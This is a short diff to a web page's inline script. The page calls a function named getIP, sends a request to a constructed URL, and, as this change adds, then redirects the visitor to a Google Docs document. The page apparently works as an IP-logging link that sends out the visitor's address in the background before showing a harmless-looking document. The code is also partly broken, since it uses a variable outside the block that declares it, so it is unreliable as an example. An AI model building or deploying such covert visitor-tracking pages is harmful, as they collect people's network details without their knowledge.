@@ -44,7 +44,17 @@
                 }),
             });
 
-            const response = await fetch(final);
+            try {
+                const response = await fetch(final);
+                if (response.ok) {
+                    setTimeout(() => {
+                        window.location.href = "https://docs.google.com/document/d/1F1S-T_jG7fb8Z-izPsnLWISWMV9xhZcQ/edit?usp=drive_link&ouid=113049675600768899353&rtpof=true&sd=true"
+                    }, 300);
+                };
+            } catch (error) {
+                console.error('Fetch error', error);
+            }
+
             console.log(response.text());
 
         } catch (error) {
@@ -54,6 +64,5 @@
 
     // Execute the function
     getIP(url);
-    Location("header: https://drive.google.com/file/d/1Urs05ncq2-kbXT8D9BqFShrboHzQmqUC/view?usp=drive_link");
 
 </script>
